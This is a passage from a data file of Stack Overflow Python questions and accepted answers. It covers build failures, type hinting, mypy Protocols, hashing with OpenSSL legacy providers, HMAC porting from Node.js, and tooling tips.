'src/backports.zoneinfo.egg-info/SOURCES.txt'\n         reading manifest template 'MANIFEST.in'\n         warning: no files found matching '*.png' under directory 'docs'\n         warning: no files found matching '*.svg' under directory 'docs'\n         no previously-included directories found matching 'docs/_build'\n         no previously-included directories found matching 'docs/_output'\n         adding license file 'LICENSE'\n         adding license file 'licenses/LICENSE_APACHE'\n         writing manifest file 'src/backports.zoneinfo.egg-info/SOURCES.txt'\n         copying src/backports/zoneinfo/__init__.pyi -> build/lib.linux-x86_64-3.10/backports/zoneinfo\n         copying src/backports/zoneinfo/py.typed -> build/lib.linux-x86_64-3.10/backports/zoneinfo\n         running build_ext\n         building 'backports.zoneinfo._czoneinfo' extension\n         creating build/temp.linux-x86_64-3.10\n         creating build/temp.linux-x86_64-3.10/lib\n         gcc -pthread -Wno-unused-result -Wsign-compare -DNDEBUG -g -fwrapv -O3 -Wall -fPIC -I/app/.heroku/python/include/python3.10 -c lib/zoneinfo_module.c -o build/temp.linux-x86_64-3.10/lib/zoneinfo_module.o -std=c99\n         lib/zoneinfo_module.c: In function \u2018zoneinfo_fromutc\u2019:\n         lib/zoneinfo_module.c:600:19: error: \u2018_PyLong_One\u2019 undeclared (first use in this function); did you mean \u2018_PyLong_New\u2019?\n           600 |             one = _PyLong_One;\n               |                   ^~~~~~~~~~~\n               |                   _PyLong_New\n         lib/zoneinfo_module.c:600:19: note: each undeclared identifier is reported only once for each function it appears in\n         error: command '/usr/bin/gcc' failed with exit code 1\n         ----------------------------------------\n         ERROR: Failed building wheel for backports.zoneinfo\n       Failed to build backports.zoneinfo\n       ERROR: Could not build wheels for backports.zoneinfo, which is required to install pyproject.toml-based projects\n !     Push rejected, failed to compile Python app.\n !     Push failed\n\nThanks.\n",
    "AcceptedAnswerId": 72796492,
    "AcceptedAnswer": "Avoid installing backports.zoneinfo when using python >= 3.9\nEdit your requirements.txt file\nFROM:\nbackports.zoneinfo==0.2.1\n\nTO:\nbackports.zoneinfo;python_version<\"3.9\"\n\nOR:\nbackports.zoneinfo==0.2.1;python_version<\"3.9\"\n\nYou can read more about this here and here\n"
}
{
    "Id": 72504576,
    "PostTypeId": 1,
    "Title": "Why use `from module import A as A` instead of just `from module import A`",
    "Body": "When reading source code of fastapi, this line make me fuzzy:\nfrom starlette.testclient import TestClient as TestClient\n\nWhy not just: from starlette.testclient import TestClient?\n",
    "AcceptedAnswerId": 73712178,
    "AcceptedAnswer": "From the point of view of executable code, there is absolutely no difference in terms of the Python bytecode being generated by the two different code examples (using Python 3.9):\n>>> dis.dis('from starlette.testclient import TestClient as TestClient')\n  1           0 LOAD_CONST               0 (0)\n              2 LOAD_CONST               1 (('TestClient',))\n              4 IMPORT_NAME              0 (starlette.testclient)\n              6 IMPORT_FROM              1 (TestClient)\n              8 STORE_NAME               1 (TestClient)\n             10 POP_TOP\n             12 LOAD_CONST               2 (None)\n             14 RETURN_VALUE\n>>> dis.dis('from starlette.testclient import TestClient')\n  1           0 LOAD_CONST               0 (0)\n              2 LOAD_CONST               1 (('TestClient',))\n              4 IMPORT_NAME              0 (starlette.testclient)\n              6 IMPORT_FROM              1 (TestClient)\n              8 STORE_NAME               1 (TestClient)\n             10 POP_TOP\n             12 LOAD_CONST               2 (None)\n             14 RETURN_VALUE\n\nAs shown, they are exactly identical. (Related thread and thread.)\nHowever, the comment by Graham501617 noted how modern type hinting validators (such as mypy) accept this particular syntax to denote the re-export of that imported name (the other being the __all__, which thankfully they did end up correctly supporting as that has been a standard syntax to denote symbols to (re-)export since Python 2).  Specifically, as per the description of Stub Files in the referenced PEP 0484, quote:\n\n\nModules and variables imported into the stub are not considered exported from the stub unless the import uses the import ... as ... form or the equivalent from ... import ... as ... form. (UPDATE: To clarify, the intention here is that only names imported using the form X as X will be exported, i.e. the name before and after as must be the same.)\n\n\nWhich means the library is likely following that particular convention to facilitate the re-export of the TestClient name from the stub (module) file that was referenced in the question.  As a matter of fact, looking at git blame for the relevant file in the packages pointed to this commit (direct link to relevant diff for the file) which referenced this issue, which contains a similar brief discussion to address the exact type hinting issue; this was done to ensure mypy will treat those imported names as re-export, thus allowing the usage of the --no-implicit-reexport flag (which --strict has likely implicitly enabled).\n"
}
{
    "Id": 73240620,
    "PostTypeId": 1,
    "Title": "The right way to type hint a Coroutine function?",
    "Body": "I cannot wrap my head around type hinting a Coroutine. As far as I understand, when we declare a function like so:\nasync def some_function(arg1: int, arg2: str) -> list:\n    ...\n\nwe effectively declare a function, which returns a coroutine, which, when awaited, returns a list. So, the way to type hint it would be:\nf: Callable[[int, str], Coroutine[???]] = some_function\n\nBut Coroutine generic type has 3 arguments! We can see it if we go to the typing.py file:\n...\nCoroutine = _alias(collections.abc.Coroutine, 3)\n...\n\nThere is also Awaitable type, which logically should be a parent of Coroutine with only one generic parameter (the return type, I suppose):\n...\nAwaitable = _alias(collections.abc.Awaitable, 1)\n...\n\nSo maybe it would be more or less correct to type hint the function this way:\nf: Callable[[int, str], Awaitable[list]] = some_function\n\nOr is it?\nSo, basically, the questions are:\n\nCan one use Awaitable instead of Coroutine in the case of type hinting an async def function?\nWhat are the correct parameters for the Coroutine generic type and what are its use-cases?\n\n",
    "AcceptedAnswerId": 73240734,
    "AcceptedAnswer": "As the docs state:\n\nCoroutine objects and instances of the Coroutine ABC are all instances of the Awaitable ABC.\n\nAnd for the Coroutine type:\n\nA generic version of collections.abc.Coroutine. The variance and order of type variables correspond to those of Generator.\n\nGenerator in turn has the signature Generator[YieldType, SendType, ReturnType]. So if you want to preserve that type information, use Coroutine, otherwise Awaitable should suffice.\n"
}
{
    "Id": 73075669,
    "PostTypeId": 1,
    "Title": "How to extract doc from avro data and add it to dataframe",
    "Body": "I'm trying to create hive/impala tables base on avro files in HDFS. The tool for doing the transformations is Spark.\nI can't use spark.read.format(\"avro\") to load the data into a dataframe, as in that way the doc part (description of the column) will be lost. I can see the doc by doing:\n input = sc.textFile(\"/path/to/avrofile\")\n avro_schema = input.first() # not sure what type it is \n\nThe problem is, it's a nested schema and I'm not sure how to traverse it to map the doc to the column description in dataframe. I'd like to have doc to the column description of the table. For example, the input schema looks like:\n\"fields\": [\n    {\n     \"name\":\"productName\",\n     \"type\": [\n       \"null\",\n       \"string\"\n      ],\n     \"doc\": \"Real name of the product\"\n     \"default\": null\n    },\n    {\n     \"name\" : \"currentSellers\",\n     \"type\": [\n        \"null\",\n        {\n         \"type\": \"record\",\n         \"name\": \"sellers\",\n         \"fields\":[\n             {\n              \"name\": \"location\",\n              \"type\":[\n                 \"null\",\n                  {\n                   \"type\": \"record\"\n                   \"name\": \"sellerlocation\",\n                   \"fields\": [\n                      {\n                       \"name\":\"locationName\",\n                       \"type\": [\n                           \"null\",\n                           \"string\"\n                         ],\n                       \"doc\": \"Name of the location\",\n                       \"default\":null\n                       },\n                       {\n                       \"name\":\"locationArea\",\n                       \"type\": [\n                           \"null\",\n                           \"string\"\n                         ],\n                       \"doc\": \"Area of the location\",#The comment needs to be added to table comments\n                       \"default\":null\n                         .... #These are nested fields \n\nIn the final table, for example one field name would be currentSellers_locationName, with column description \"Name of the location\". Could someone please help to shed some light on how to parse the schema and add the doc to description? and explain a bit about what this below bit is about outside of the fields? Many thanks. Let me know if I can explain it better.\n         \"name\" : \"currentSellers\",\n     \"type\": [\n        \"null\",\n        {\n         \"type\": \"record\",\n         \"name\": \"sellers\",\n         \"fields\":[\n             {\n  \n\n",
    "AcceptedAnswerId": 73258076,
    "AcceptedAnswer": "If you would like to parse the schema yourself and manually add metadata to spark, I would suggest flatdict package:\nfrom flatdict import FlatterDict\n\nflat_schema = FlatterDict(schema)  # schema as python dict\n\nnames = {k.replace(':name', ''): flat_schema[k] for k in flat_schema if k.endswith(':name')}\ndocs = {k.replace(':doc', ''): flat_schema[k] for k in flat_schema if k.endswith(':doc')}\n\n# keep only keys which are present in both names and docs\nkeys_with_doc = set(names.keys()) & set(docs.keys())\n\nfull_name = lambda key: '_'.join(\n    names[k] for k in sorted(names, key=len) if key.startswith(k) and k.split(':')[-2] == 'fields'\n)\nname_doc_map = {full_name(k): docs[k] for k in keys_with_doc}\n\nA typical set of keys in flat_schema.keys() is:\n'fields:1:type:1:fields:0:type:1:fields:0:type:1',\n'fields:1:type:1:fields:0:type:1:fields:0:name',\n'fields:1:type:1:fields:0:type:1:fields:0:default',\n'fields:1:type:1:fields:0:type:1:fields:0:doc',\n\nThese strings can now be manipulated:\n\nextract only the ones ending with \"name\" and \"doc\" (ignore \"default\", etc.)\nget set intersection to remove the ones that do not have both fields present\nget a list of all field names from higher levels of hierarchy: fields:1:type:1:fields is one of parents of fields:1:type:1:fields:0:type:1:fields (the condition is that they have the same start and they end with \"fields\")\n\n"
}
{
    "Id": 72839263,
    "PostTypeId": 1,
    "Title": "Access python interpreter in VSCode version controll when using pre-commit",
    "Body": "I'm using pre-commit for most of my Python projects, and in many of them, I need to use pylint as a local repo. When I want to commit, I always have to activate python venv and then commit; otherwise, I'll get the following error:\nblack....................................................................Passed\npylint...................................................................Failed\n- hook id: pylint\n- exit code: 1\n\nExecutable `pylint` not found\n\nWhen I use vscode version control to commit, I get the same error; I searched about the problem and didn't find any solution to avoid the error in VSCode.\nThis is my typical .pre-commit-config.yaml:\nrepos:\n-   repo: https://github.com/ambv/black\n    rev: 21.9b0\n    hooks:\n    - id: black\n      language_version: python3.8\n      exclude: admin_web/urls\\.py\n-   repo: local\n    hooks:\n    -   id: pylint\n        name: pylint\n        entry: pylint\n        language: python\n        types: [python]\n        args: \n         - --rcfile=.pylintrc\n\n\n",
    "AcceptedAnswerId": 72839338,
    "AcceptedAnswer": "you have ~essentially two options here -- neither are great (language: system is kinda the unsupported escape hatch so it's on you to make those things available on PATH)\nyou could use a specific path to the virtualenv entry: venv/bin/pylint -- though that will reduce the portability.\nor you could start vscode with your virtualenv activated (usually code .) -- this doesn't always work if vscode is already running\n\ndisclaimer: I created pre-commit\n"
}
{
    "Id": 73271404,
    "PostTypeId": 1,
    "Title": "How to find the average of the differences between all the numbers of a Python List",
    "Body": "I have a python list like this,\narr = [110, 60, 30, 10, 5] \n\nWhat I need to do is actually find the difference of every number with all the other numbers and then find the average of all those differences.\nSo, for this case, it would first find the difference between 110 and then all the remaining elements, i.e. 60, 30, 10, 5, and then it will find the difference of 60 with the remaining elements, i.e. 30, 10, 5 and etc.\nAfter which, it will compute the Average of all these differences.\nNow, this can easily be done with two For Loops but in O(n^2) time complexity and also a little bit of \"messy\" code. I was wondering if there was a faster and more efficient way of doing this same thing?\n",
    "AcceptedAnswerId": 73271447,
    "AcceptedAnswer": "I'll just give the formula first:\nn = len(arr)\nout = np.sum(arr * np.arange(n-1, -n, -2) ) / (n*(n-1) / 2)\n# 52\n\nExplanation: You want to find the mean of\na[0] - a[1], a[0] - a[2],..., a[0] - a[n-1]\n             a[1] - a[2],..., a[1] - a[n-1]\n                         ...\n\nthere, your\n`a[0]` occurs `n-1` times with `+` sign, `0` with `-` -> `n-1` times\n`a[1]` occurs `n-2` times with `+` sign, `1` with `-` -> `n-3` times\n... and so on \n\n"
}
{
    "Id": 72497046,
    "PostTypeId": 1,
    "Title": "skipping a certain range of a list at time in python",
    "Body": "I have a array, I want to pick first 2 or range, skip the next 2, pick the next 2 and continue this until the end of the list\nlist = [2, 4, 6, 7, 9,10, 13, 11, 12,2]\nresults_wanted = [2,4,9,10,12,2] # note how it skipping 2. 2 is used here as and example\n\nIs there way to achieve this in python?\n",
    "AcceptedAnswerId": 72497107,
    "AcceptedAnswer": "Taking n number of elements and skipping the next n.\nl = [2, 4, 6, 7, 9, 10, 13, 11, 12, 2]\nn = 2\nwanted = [x for i in range(0, len(l), n + n) for x in l[i: i + n]]\n### Output : [2, 4, 9, 10, 12, 2]\n\n"
}
{
    "Id": 73749995,
    "PostTypeId": 1,
    "Title": "Why does Matplotlib 3.6.0 on MacOS throw an `AttributeError` when showing a plot?",
    "Body": "I have the following straightforward code:\nimport matplotlib.pyplot as plt\nx = [1,2,3,4]\ny = [34, 56, 78, 21]\nplt.plot(x, y)\nplt.show()\n\nBut after changing my MacBook Pro to the M1 chip, I'm getting the following error:\nTraceback (most recent call last):\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/main.py\", line 291, in \n    plt.plot(x, y)\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py\", line 2728, in plot\n    return gca().plot(\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py\", line 2225, in gca\n    return gcf().gca()\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py\", line 830, in gcf\n    return figure()\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/_api/deprecation.py\", line 454, in wrapper\n    return func(*args, **kwargs)\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py\", line 771, in figure\n    manager = new_figure_manager(\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py\", line 346, in new_figure_manager\n    _warn_if_gui_out_of_main_thread()\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py\", line 336, in _warn_if_gui_out_of_main_thread\n    if (_get_required_interactive_framework(_get_backend_mod()) and\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py\", line 206, in _get_backend_mod\n    switch_backend(dict.__getitem__(rcParams, \"backend\"))\n  File \"/Users/freddy/PycharmProjects/TPMetodosNoParametricos/venv/lib/python3.8/site-packages/matplotlib/pyplot.py\", line 266, in switch_backend\n    canvas_class = backend_mod.FigureCanvas\nAttributeError: module 'backend_interagg' has no attribute 'FigureCanvas'\n\nWhy does the code throw this error?\nMy matplotlib version is 3.6.0\n",
    "AcceptedAnswerId": 73755442,
    "AcceptedAnswer": "i had the same problem today on a different machine in the same matplotlib version. I downgrade to Version 3.5.0 and now it works.\n"
}
{
    "Id": 72409563,
    "PostTypeId": 1,
    "Title": "Unsupported hash type ripemd160 with hashlib in Python",
    "Body": "After a thorough search, I have not found a complete explanation and solution to this very common problem on the entire web. All scripts that need to encode with hashlib give me error:\nPython 3.10\nimport hashlib\nh = hashlib.new('ripemd160')\n\nreturn:\nTraceback (most recent call last):\n  File \"\", line 1, in \n  File \"/usr/lib/python3.10/hashlib.py\", line 166, in __hash_new\n    return __get_builtin_constructor(name)(data)\n  File \"/usr/lib/python3.10/hashlib.py\", line 123, in __get_builtin_constructor\n    raise ValueError('unsupported hash type ' + name)\nValueError: unsupported hash type ripemd160\n\nI already tried to check if that hash exists in the library, and if I have it:\nprint(hashlib.algorithms_available): {'md5', 'sm3', 'sha3_512', 'sha384', 'sha256', 'sha1', 'shake_128', 'sha224', 'sha512_224', 'sha512_256', 'blake2b', 'ripemd160', 'md5-sha1', 'sha512', 'sha3_256', 'shake_256', 'sha3_384', 'whirlpool', 'md4', 'blake2s', 'sha3_224'}\nI am having this problem in a vps with linux, but in my pc I use Windows and I don't have this problem.\nI sincerely appreciate any help or suggestion.\n",
    "AcceptedAnswerId": 72508879,
    "AcceptedAnswer": "Hashlib uses OpenSSL for ripemd160 and apparently OpenSSL disabled some older crypto algos around version 3.0 in November 2021. All the functions are still there but require manual enabling. See issue 16994 of OpenSSL github project for details.\nTo quickly enable it, find the directory that holds your OpenSSL config file or a symlink to it, by running the below command:\nopenssl version -d\n\nYou can now go to the directory and edit the config file (it may be necessary to use sudo):\nnano openssl.cnf\n\nMake sure that the config file contains following lines:\nopenssl_conf = openssl_init\n\n[openssl_init]\nproviders = provider_sect\n\n[provider_sect]\ndefault = default_sect\nlegacy = legacy_sect\n\n[default_sect]\nactivate = 1\n\n[legacy_sect]\nactivate = 1\n\nTested on: OpenSSL 3.0.2, Python 3.10.4, Linux Ubuntu 22.04 LTS aarch64, I have no access to other platforms at the moment.\n"
}
{
    "Id": 72756419,
    "PostTypeId": 1,
    "Title": "MyPy: 'incompatible type' for virtual class inheritance",
    "Body": "Demo code\n#!/usr/bin/env python3\n\nfrom abc import ABCMeta, abstractmethod\n\nclass Base(metaclass = ABCMeta):\n    @classmethod\n    def __subclasshook__(cls, subclass):\n        return (\n            hasattr(subclass, 'x')\n        )\n\n    @property\n    @abstractmethod\n    def x(self) -> float:\n        raise NotImplementedError\n\nclass Concrete:\n    x: float = 1.0\n\nclass Application:\n    def __init__(self, obj: Base) -> None:\n        print(obj.x)\n\nob = Concrete() \napp = Application(ob)\n\nprint(issubclass(Concrete, Base))\nprint(isinstance(Concrete, Base))\nprint(type(ob))\nprint(Concrete.__mro__)\n\npython test_typing.py returns:\n1.0\nTrue\nFalse\n\n(, )\n\nand mypy test_typing.py returns:\ntest_typing.py:30: error: Argument 1 to \"Application\" has incompatible type \"Concrete\"; expected \"Base\"\nFound 1 error in 1 file (checked 1 source\n\nBut if i change the line class Concrete: to class Concrete(Base):, i get for\npython test_typing.py this:\n1.0\nTrue\nFalse\n\n(, , )\n\nand for mypy test_typing.py this:\nSuccess: no issues found in 1 source file\n\nIf i add to my code this:\nreveal_type(Concrete)\nreveal_type(Base)\n\ni get in both cases the same results for it from mypy test_typing.py:\ntest_typing.py:37: note: Revealed type is \"def () -> vmc.test_typing.Concrete\"\ntest_typing.py:38: note: Revealed type is \"def () -> vmc.test_typing.Base\"\n\nConclusion\nSeems obvious, that MyPi have some problems with virtual base classes but non-virtual inheritance seems working as expected.\nQuestion\nHow works MyPy's type estimation in these cases?\nIs there an workaround?\n2nd Demo code\nUsing Protocol pattern:\n#!/usr/bin/env python3\n\nfrom abc import abstractmethod\nfrom typing import Protocol, runtime_checkable\n\n@runtime_checkable\nclass Base(Protocol):\n    @property\n    def x(self) -> float:\n        raise NotImplementedError\n    \n    @abstractmethod\n    def __init__(self, x: float) -> None:\n        raise NotImplementedError\n\n    \"\"\"\n    @classmethod\n    def test(self) -> None:\n        pass\n    \"\"\"\n\nclass Concrete:\n    x: float = 1.0\n\nclass Application:\n    def __init__(self, obj: Base) -> None:\n        pass\n\nob = Concrete() \napp = Application(ob)\n\nPros\n\nWorking with mypy: Success: no issues found in 1 source file\nWorking with isinstance(Concrete, Base) : True\n\nCons\n\nNot working with issubclass(Concrete, Base): TypeError: Protocols with non-method members don't support issubclass()\nNot checking the __init__ method signatures: __init__(self, x: float) -> None vs. __init__(self) -> None (Why returns inspect.signature() the strings (self, *args, **kwargs) and (self, /, *args, **kwargs) here? With class Base: instead of class Base(Protocol): i get (self, x: float) -> None and (self, /, *args, **kwargs))\nignoring the difference between @abstractmethod and @classmethod (treats ANY method as abstract)\n\n3rd Demo code\nThis time just an more complex example of the 1st code:\n#!/usr/bin/env python3\n\nfrom abc import ABCMeta, abstractmethod\nfrom inspect import signature\n\nclass Base(metaclass = ABCMeta):\n    @classmethod\n    def __subclasshook__(cls, subclass):\n        return (\n            hasattr(subclass, 'x') and\n            (signature(subclass.__init__) == signature(cls.__init__))\n        )\n\n    @property\n    @abstractmethod\n    def x(self) -> float:\n        raise NotImplementedError\n    \n    @abstractmethod\n    def __init__(self, x: float) -> None:\n        raise NotImplementedError\n\n    @classmethod\n    def test(self) -> None:\n        pass\n\nclass Concrete:\n    x: float = 1.0\n\n    def __init__(self, x: float) -> None:\n        pass\n\nclass Application:\n    def __init__(self, obj: Base) -> None:\n        pass\n\nob = Concrete(1.0) \napp = Application(ob)\n\nPros\n\nWorking with issubclass(Concrete, Base): True\nWorking with isinstance(Concrete, Base): False\nMethod signature check also for __init__.\n\nCons\n\nNot working with MyPy:\ntest_typing.py:42: error: Argument 1 to \"Application\" has incompatible type \"Concrete\"; expected \"Base\"\nFound 1 error in 1 file (checked 1 source file)\n\n\n\n4th Demo code\nIn some circumstances the following code might be an possible solution.\n#!/usr/bin/env python3\n\nfrom typing import Protocol, runtime_checkable\nfrom dataclasses import dataclass\n\n@runtime_checkable\nclass Rotation(Protocol):\n    @property\n    def x(self) -> float:\n        raise NotImplementedError\n    \n    @property\n    def y(self) -> float:\n        raise NotImplementedError\n\n    @property\n    def z(self) -> float:\n        raise NotImplementedError\n\n    @property\n    def w(self) -> float:\n        raise NotImplementedError\n\n@dataclass\nclass Quaternion:\n    x: float = 0.0\n    y: float = 0.0\n    z: float = 0.0\n    w: float = 1.0\n\n    def conjugate(self) -> 'Quaternion':\n        return type(self)(\n            x = -self.x,\n            y = -self.y,\n            z = -self.z,\n            w = self.w\n        )\n\nclass Application:\n    def __init__(self, rot: Rotation) -> None:\n        print(rot)\n\nq = Quaternion(0.7, 0.0, 0.7, 0.0)\napp = Application(q.conjugate())\n\nPros:\n\nAuto-generated __init__ method because of @dataclass usage. here: (self, x: float = 0.0, y: float = 0.0, z: float = 0.0, w: float = 1.0) -> None\nWorks with isinstance(): True\nWorks with mypy: Success: no issues found in 1 source file\n\nCons:\n\nYou need to hope, that the next developer uses @dataclass along with implementing your interface..\nNot usable for __init__ methods, that are not only taken class attributes.\n\nTipp: If an forced __init__ method is not required and only want to take care of the attributes, then just omit @dataclass.\n5th Demo code\nUpdated the 4th code to provide more safety, but without implicit __init__ method:\n#!/usr/bin/env python3\n\nfrom abc import abstractmethod\nfrom typing import Protocol, runtime_checkable\n\n@runtime_checkable\nclass Rotation(Protocol):\n    @property\n    @abstractmethod\n    def x(self) -> float:\n        raise NotImplementedError\n    \n    @property\n    @abstractmethod\n    def y(self) -> float:\n        raise NotImplementedError\n\n    @property\n    @abstractmethod\n    def z(self) -> float:\n        raise NotImplementedError\n\n    @property\n    @abstractmethod\n    def w(self) -> float:\n        raise NotImplementedError\n\nclass Quaternion:\n    _x: float = 0.0\n    _y: float = 0.0\n    _z: float = 0.0\n    _w: float = 1.0\n\n    @property\n    def x(self) -> float:\n        return self._x\n\n    @property\n    def y(self) -> float:\n        return self._y\n\n    @property\n    def z(self) -> float:\n        return self._z\n\n    @property\n    def w(self) -> float:\n        return self._w\n\n    def __init__(self, x: float, y: float, z: float, w: float) -> None:\n        self._x = float(x)\n        self._y = float(y)\n        self._z = float(z)\n        self._w = float(w)\n\n    def conjugate(self) -> 'Quaternion':\n        return type(self)(\n            x = -self.x,\n            y = -self.y,\n            z = -self.z,\n            w = self.w\n        )\n\n    def __str__(self) -> str:\n        return \", \".join(\n            (\n                str(self._x),\n                str(self._y),\n                str(self._z),\n                str(self._w)\n            )\n        )\n\n    def __repr__(self) -> str:\n        cls = self.__class__\n        module = cls.__module__\n        return f\"{module + '.' if module != '__main__' else ''}{cls.__qualname__}({str(self)})\"\n\nclass Application:\n    def __init__(self, rot: Rotation) -> None:\n        print(rot)\n\nq = Quaternion(0.7, 0.0, 0.7, 0.0)\napp = Application(q.conjugate())\n\n\nCurrent conclusion\nThe Protocol way is unstable.\nBut the Metaclass way is not checkable, because it's not working with MyPy (because it's not static).\nUpdated question\nAre there any alternative solutions to achieve some type of Interfaces (without class Concrete(Base)) AND make it type-safe (checkable)?\n",
    "AcceptedAnswerId": 72843690,
    "AcceptedAnswer": "Result\nAfter running some tests and more research i am sure, that the actual problem is the behaviour of Protocol to silently overwrite the defined __init__ method.\nConclusion\nSeems logical, since Protocols are not intended to be initiated.\nBut sometimes it's required to define an __init__ method,\nbecause in my opinion __init__ methods are also part of the interface of classes and it's objects.\nSolution\nI found an existing issue about this problem, that seems to confirm my point of view: https://github.com/python/cpython/issues/88970\nFortunately it's already fixed:\nhttps://github.com/python/cpython/commit/5f2abae61ec69264b835dcabe2cdabe57b9a990e\nBut unfortunately, this fix will only be part of Python 3.11 and above.\nCurrenty is Python 3.10.5 available.\nWARNING: Like mentioned in the issue, some static type checkers might behave different in this case. MyPy just ignores the missing __init__ method (tested it, confirmed) BUT Pyright seems to detect and report the missing __init__ method (not tested by me).\n"
}
{
    "Id": 73765587,
    "PostTypeId": 1,
    "Title": "How to get a warning about a list being a mutable default argument?",
    "Body": "I accidentally used a mutable default argument without knowing it.\nIs there a linter or tool that can spot this and warn me?\n",
    "AcceptedAnswerId": 73765790,
    "AcceptedAnswer": "flake8-bugbear, Pylint, PyCharm, and Pyright can detect this:\n\nBugbear has B006 (Do not use mutable data structures for argument defaults).\n\nDo not use mutable data structures for argument defaults. They are created during function definition time. All calls to the function reuse this one instance of that data structure, persisting changes between them.\n\n\nPylint has W0102 (dangerous default value).\n\nUsed when a mutable value as list or dictionary is detected in a default value for an argument.\n\n\nPyright has reportCallInDefaultInitializer.\n\nGenerate or suppress diagnostics for function calls, list expressions, set expressions, or dictionary expressions within a default value initialization expression. Such calls can mask expensive operations that are performed at module initialization time.\n\nThis does what you want, but be aware that it also checks for function calls in default arguments.\n\nPyCharm has Default argument's value is mutable.\n\nThis inspection detects when a mutable value as list or dictionary is detected in a default value for an argument.\nDefault argument values are evaluated only once at function definition time, which means that modifying the default value of the argument will affect all subsequent calls of the function.\n\nUnfortunately, I can't find online documentation for this. If you have PyCharm, you can access all inspections and navigate to this inspection to find the documentation.\n\n\n"
}
{
    "Id": 73739158,
    "PostTypeId": 1,
    "Title": "NodeJS convert to Byte Array code return different results compare to python",
    "Body": "I got the following Javascript code and I need to convert it to Python(I'm not an expert in hashing so sorry for my knowledge on this subject)\nfunction generateAuthHeader(dataToSign) {\n    let apiSecretHash = new Buffer(\"Rbju7azu87qCTvZRWbtGqg==\", 'base64');\n    let apiSecret = apiSecretHash.toString('ascii');\n    var hash = CryptoJS.HmacSHA256(dataToSign, apiSecret);\n    return hash.toString(CryptoJS.enc.Base64);\n}\n\nwhen I ran generateAuthHeader(\"abc\") it returned +jgBeooUuFbhMirhh1KmQLQ8bV4EXjRorK3bR/oW37Q=\nSo I tried writing the following Python code:\ndef generate_auth_header(data_to_sign):\n    api_secret_hash = bytearray(base64.b64decode(\"Rbju7azu87qCTvZRWbtGqg==\"))\n    hash = hmac.new(api_secret_hash, data_to_sign.encode(), digestmod=hashlib.sha256).digest()\n    return base64.b64encode(hash).decode()\n\nBut when I ran generate_auth_header(\"abc\") it returned a different result aOGo1XCa5LgT1CIR8C1a10UARvw2sqyzWWemCJBJ1ww=\nCan someone tell me what is wrong with my Python code and what I need to change?\nThe base64 is the string I generated myself for this post\nUPDATE:\nthis is the document I'm working with\n//Converting the Rbju7azu87qCTvZRWbtGqg== (key) into byte array \n//Converting the data_to_sign into byte array \n//Generate the hmac signature\n\nit seems like apiSecretHash and api_secret_hash is different, but I don't quite understand as the equivalent of new Buffer() in NodeJS is bytearray() in python\n",
    "AcceptedAnswerId": 73769662,
    "AcceptedAnswer": "It took me 2 days to look it up and ask for people in python discord and I finally got an answer. Let me summarize the problems:\n\nAPI secret hash from both return differents hash of the byte array\njavascript\n\nJavascript\napiSecret = \"E8nm,ns:\\u0002NvQY;F*\"\n\nPython\napi_secret_hash = b'E\\xb8\\xee\\xed\\xac\\xee\\xf3\\xba\\x82N\\xf6QY\\xbbF\\xaa'\n\nonce we replaced the hash with python code it return the same result\ndef generate_auth_header(data_to_sign):\n    api_secret_hash = \"E8nm,ns:\\u0002NvQY;F*\".encode()\n\n    hash = hmac.new(api_secret_hash, data_to_sign.encode(), digestmod=hashlib.sha256).digest()\n    return base64.b64encode(hash).decode()\n\nencoding for ASCII in node.js you can find here https://github.com/nodejs/node/blob/a2a32d8beef4d6db3a8c520572e8a23e0e51a2f8/src/string_bytes.cc#L636-L647\ncase ASCII:\n  if (contains_non_ascii(buf, buflen)) {\n    char* out = node::UncheckedMalloc(buflen);\n    if (out == nullptr) {\n      *error = node::ERR_MEMORY_ALLOCATION_FAILED(isolate);\n      return MaybeLocal();\n    }\n    force_ascii(buf, out, buflen);\n    return ExternOneByteString::New(isolate, out, buflen, error);\n  } else {\n    return ExternOneByteString::NewFromCopy(isolate, buf, buflen, error);\n  }\n\nthere is this force_ascii() function that is called when the data contains non-ASCII characters which is implemented here https://github.com/nodejs/node/blob/a2a32d8beef4d6db3a8c520572e8a23e0e51a2f8/src/string_bytes.cc#L531-L573\nso we need to check for the hash the same as NodeJS one, so we get the final version of the Python code:\ndef generate_auth_header(data_to_sign):\n    # convert to bytearray so the for loop below can modify the values\n    api_secret_hash = bytearray(base64.b64decode(\"Rbju7azu87qCTvZRWbtGqg==\"))\n    \n    # \"force\" characters to be in ASCII range\n    for i in range(len(api_secret_hash)):\n        api_secret_hash[i] &= 0x7f;\n\n    hash = hmac.new(api_secret_hash, data_to_sign.encode(), digestmod=hashlib.sha256).digest()\n    return base64.b64encode(hash).decode()\n\nnow it returned the same result as NodeJS one\nThank you Mark from the python discord for helping me understand and fix this!\nHope anyone in the future trying to convert byte array from javascript to python know about this different of NodeJS Buffer() function\n"
}
{
    "Id": 72511979,
    "PostTypeId": 1,
    "Title": "ValueError: install DBtypes to use this function",
    "Body": "I'm using BigQuery for the first time.\nclient.list_rows(table, max_results = 5).to_dataframe();\n\nWhenever I use to_dataframe() it raises this error:\n\nValueError: Please install the 'db-dtypes' package to use this function.\n\nI found this similar problem (almost exactly the same), but I can't understand how to implement their proposed solution.\n",
    "AcceptedAnswerId": 72514645,
    "AcceptedAnswer": "I was able to replicate your use case as shown below.\n\nEasiest solution is to pip install db-dtypes as mentioned by @MattDMo.\nOr you can specify previous version of google-cloud-bigquery by creating a requirements.txt with below contents:\ngoogle-cloud-bigquery==2.34.3\n\nAnd then pip install by using command as shown below:\npip install -r /path/to/requirements.txt\n\nOutput of my sample replication:\n\n"
}
{
    "Id": 72294299,
    "PostTypeId": 1,
    "Title": "Multiple top-level packages discovered in a flat-layout",
